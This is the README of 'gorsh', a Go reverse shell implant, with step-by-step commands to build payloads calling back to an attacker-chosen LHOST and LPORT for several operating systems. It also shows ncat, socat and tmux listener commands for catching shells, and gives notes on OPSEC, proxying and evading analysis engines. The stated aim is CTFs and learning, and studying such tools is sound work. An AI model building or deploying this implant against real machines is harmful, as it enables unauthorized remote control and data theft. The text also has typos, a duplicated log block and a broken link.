# gorsh

[go]lang [r]everse [sh]ell

![](https://i.imgur.com/x51XH6K.png)
![](https://i.imgur.com/pvCmHYa.png)

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Motivation

Learn go.  
Make a throwaway reverse shell for things like CTFs.  
Learn about host-based OPSEC considerations when writing an implant.

## Fork Changes
Changes after fork:

* Uses tmux as a pseudo-C2-like interface, creating a new window with each agent callback
* Download files with HTTP on all platform
* Download files with SMB on all windows
* Situational Awareness output on new shells
* Removed Meterpreter functionality
* Removed Shellcode execution
* Remove the use of passing power/shell commands at the gorsh prompt
* Add common file operation commands that use go instead of power/shell

Roadmap:

- [ ] Potentially add reverse socks5 proxy functionality - Using
[Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)
- [ ] Recon module for analyzing things like tasks, services, and host-based protections
- [ ] Dotnet integration so `shell` drops into a Runspace with System.Management.Automation. 
      Bacially PowerShell without PowerShell.


## Dependencies

I can only speak to dependencies require to build on a 64-bit Debian or Ubuntu machine,
but there is no significant diffuclt acquiring these packages on other distributions

```$ sudo apt-get install gcc-mingw-w64 binutils-mingw-w64-x86-64```

That's it as far cross-compiling to Windows64 goes. While it is often require during cross-compilation
to set variables like `$CC, $CXX, $AS, $LD, ...` it is not required as `go1.11 linux/amd64` picks
up on the presence of the toolchain it needs.

## Build problems

#### Not enabling CGO

If you are experiencing build problems, specifically this error:

```
# github.com/valyala/gozstd
../src/github.com/valyala/gozstd/stream.go:31:59: undefined: CDict
../src/github.com/valyala/gozstd/stream.go:35:64: undefined: CDict
../src/github.com/valyala/gozstd/stream.go:47:20: undefined: Writer
```

or

```
# github.com/valyala/gozstd
../src/github.com/valyala/gozstd/stream.go:31:59: undefined: CDict
../src/github.com/valyala/gozstd/stream.go:35:64: undefined: CDict
../src/github.com/valyala/gozstd/stream.go:47:20: undefined: Writer
```

The reason is because you need CGO_ENABLED=1 before your command. Simple fix.

#### 32/64 issue when compiling on native architecture for two word register sizes

If you are seeing the following:

```
# github.com/valyala/gozstd
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_common.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_compress.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_double_fast.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_fast.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_lazy.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_ldm.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_opt.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zstd_decompress.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(zdict.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(entropy_common.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(error_private.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(fse_decompress.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(xxhash.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(fse_compress.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(hist.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(huf_compress.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(huf_decompress.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(cover.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(divsufsort.o)' is incompatible with i386 output
/usr/bin/ld: i386:x86-64 architecture of input file `/home/debian/goprojects/src/github.com/valyala/gozstd/libzstd_linux.a(pool.o)' is incompatible with i386 output
collect2: error: ld returned 1 exit status
Makefile:43: recipe for target 'linux32' failed
make: *** [linux32] Error 2
```

This is a result of installing a golang module that previously built a static library from native code using a different GOARCH but same GOOS. THe solution is
to run `go clean -i github.com/valyala/gozstd/` to remove it. This dependency should be removed and retrieved again with GOOARC and GOOS set, otherwise
it will continuously be incompatible with the host. Unfortunately, this doesn't seem to work very well. See the TODO section at the bootom.

#### Not setting CC to the correct mingw compiler for your system

If you are seeing this, specifically for the Windows target(s):

```
$ make windows64
CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go build --ldflags "-w -X main.connectString=: -X main.fingerPrint=$(openssl x509 -fingerprint -sha256 -noout -in local/server.pem | cut -d '=' -f2) -H=windowsgui" -o binaries/windows/gorsh64.exe gorsh.go
# runtime/cgo
gcc: error: unrecognized command line option ‘-mthreads’; did you mean ‘-pthread’?
Makefile:43: recipe for target 'windows64' failed
make: *** [windows64] Error 2
```

The solution is to set CC in your environment to the correct mingw 64bit-64bit gcc-posix compiler. For example, on a native 64-bit system running Debian:

 `export CC=/usr/bin/x86_64-w64-mingw32-gcc-6.3-posix`

 After this, `make windows64` should work just fine

## Getting started

This project makes use of libraries that ue CGO which means you need native libraries for the
platform and architecture for which you are trying to build.

Specifically for this project, macOS and Linux targets will build just fine but to build for
Windows, a bit of setup is required.

```sh
# debian
sudo apt install gcc-mingw-w64
```

Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
with Go and setting up your Golang environment (with the `$GOPATH` environment variable).

### Building the payload

First, you'll need to generate your certs:

```bash
$ make depends
```

To simplify things, read the provided Makefile. You can set the following environment variables:

- `GOOS`: the target OS
- `GOARCH`: the target architecture
- `LHOST`: the attacker IP or domain name
- `LPORT`: the listener port

See possible`GOOS`and`GOARCH`variables [here](https://golang.org/doc/install/source#environment).

For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.

Generate with:

```bash
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
```

## Catching the shell

The `local/start.sh` kicks off a tmux session and creates new windows on every new connection.
Feed it a port number to listen on and an `&` to send it to the background, if you'd like. 

```sh
cd local
./start.sh 443 &

# once a client connects
tmux attach -t GORSH
```

Shells can also be caught with:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

Once executed, you will be provided with the gorsh shell.
Type `help` to show what commands are supported.

## Developers Notes: utstanding issues related to building (USER CAN IGNORE THIS)


### Issue #1 - Ensuring appropriate mingw compilers are available on your system

DEBIAN: `sudo apt-get install -y gcc-mingw-w64 g++-mingw-w64 binutils-mingw-w64-x86-64`
REDHAT: `sudo yum install mingw64-gcc mingw64-g+++ mingw64-binutils`
ARCH: 	`sudo packman -S mingw-w64-gcc mingw-w64-g++ mingw-w64-binutils`

### Issue #2 - Multilib builds of GCC are problematic when building on native host

You will notice that on a system with a multilib-enabled toolchain, `make linux64 && make linux32` will succeed on the first make but fail on the second make, unless the GOOS is different. This is because a library requiring native-c compilating was built using the hosts native architecture, and `go get` and/or `go build` did not respect `GOARCH=386`

This is not a huge problem, but it is an annoyance when having to build packages often.

Aside from not running a multilib-capable compiler on your system (this doesn't mean necessarily you won't have a muultilib system), the solution may be to maintain a pair of dedicated (non-multilib) compilers, and ensure that the `go get` or `go build` process uses those. Alternately, look into how one can pass CFLAGS during `go get` or `go build` of an external package. 

While maintaining toolchains sounds like an awful lot of work, it isn't terrible if you utilize https://githug.com/richfelker/musl-cross-make and some pre-built toolchain config.mak files for forcing 32 bit builds on 64 bit hosts. Placing [this activate](https://github.com/mzpqnxow/gdb-static-cross/blob/44bddbd2f1fe3bdc41d401d754202aab67e7c3f4/activate-script-helpers/activate-musl-toolchain.env) file in the root of each resulting musl toolchain and sourcing it before building for the 32-bit architecture should more or less solve the problem. When building the i386 toolchain, ensure that the config.mak is not enabled for multilib! An example config.mak is available [here](

An issue and/or PR will be soon to follow if there is interest in fixing this "hidden" problem. It may be very rare in practice that *any* 32-bit binaries for *any* architecture are required. On the other hand, a 32-bit executable might throw off some analysis engines attempting to identify the project while deplpoyed/in-use.

## Credits

Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`

Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
